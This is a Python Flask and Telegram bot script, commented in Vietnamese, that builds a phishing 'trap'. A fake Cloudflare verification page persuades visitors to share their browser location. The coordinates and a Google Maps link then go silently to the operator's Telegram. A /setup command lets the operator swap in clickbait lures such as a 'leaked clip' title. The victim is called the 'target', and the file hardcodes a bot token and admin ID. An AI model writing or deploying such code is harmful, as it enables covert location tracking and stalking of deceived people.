import telebot
from flask import Flask, request, render_template_string
import os
from threading import Thread

TOKEN = '8222981632:AAGeWH4l1Mvmvaod8z5lVhthkyHXLtRvgOU'
ADMIN_ID = "6681014168" # ID của sếp
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# Biến tạm để lưu cấu hình bẫy
trap_data = {
    "title": "Cloudflare Verification",
    "desc": "Vui lòng xác minh bạn không phải là robot.",
    "img": "https://www.cloudflare.com/img/logo-cloudflare-dark.png",
    "redirect": "https://facebook.com"
}

# --- GIAO DIỆN BẪY LINH HOẠT ---
@app.route('/near-you')
def seeker_page():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <meta property="og:title" content="{{ title }}">
    <meta property="og:description" content="{{ desc }}">
    <meta property="og:image" content="{{ img }}">
    <style>
        body { margin: 0; background: #1a1a1a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { text-align: center; background: #252525; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; }
        .btn { background: #0582ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
    <script>
        function start() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(s => {
                    fetch(`/log?lat=${s.coords.latitude}&lon=${s.coords.longitude}`);
                    setTimeout(() => { window.location.href = "{{ redirect }}"; }, 1000);
                }, () => { window.location.href = "{{ redirect }}"; });
            }
        }
    </script>
</head>
<body>
    <div class="box">
        <img src="{{ img }}" width="60" style="margin-bottom:15px;">
        <h2>{{ title }}</h2>
        <p>{{ desc }}</p>
        <button class="btn" onclick="start()">XÁC MINH NGAY</button>
    </div>
</body>
</html>
""", **trap_data)

@app.route('/log')
def log():
    lat, lon = request.args.get('lat'), request.args.get('lon')
    bot.send_message(ADMIN_ID, f"💀 **MỤC TIÊU SẬP BẪY!**\n📍 Tọa độ: `{lat}, {lon}`\n🗺 [Xem bản đồ](http://google.com/maps?q={lat},{lon})")
    return "200"

# --- LỆNH ĐIỀU KHIỂN ---
@bot.message_handler(commands=['setup'])
def setup_trap(message):
    msg = (
        "🛠 **THIẾT LẬP BẪY MỚI**\n\n"
        "Sếp hãy gửi thông tin theo định dạng sau:\n"
        "`Tiêu đề | Mô tả | Link ảnh | Link chuyển hướng`\n\n"
        "*Ví dụ:* `Video lộ clip | Xem ngay kẻo lỡ | https://bit.ly/anh-hot | https://youtube.com`"
    )
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(func=lambda m: "|" in m.text)
def update_data(message):
    try:
        parts = message.text.split('|')
        trap_data["title"] = parts[0].strip()
        trap_data["desc"] = parts[1].strip()
        trap_data["img"] = parts[2].strip()
        trap_data["redirect"] = parts[3].strip()
        
        link = "https://my-bot-24h.onrender.com/near-you"
        bot.reply_to(message, f"✅ **ĐÃ CẬP NHẬT BẪY!**\n\n🔗 Link gửi cho mục tiêu:\n`{link}`\n\n(Bây giờ khi sếp gửi link này, nó sẽ hiện đúng tiêu đề và ảnh sếp vừa nhập!)")
    except:
        bot.reply_to(message, "❌ Sai định dạng rồi sếp ơi!")

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling(skip_pending=True)
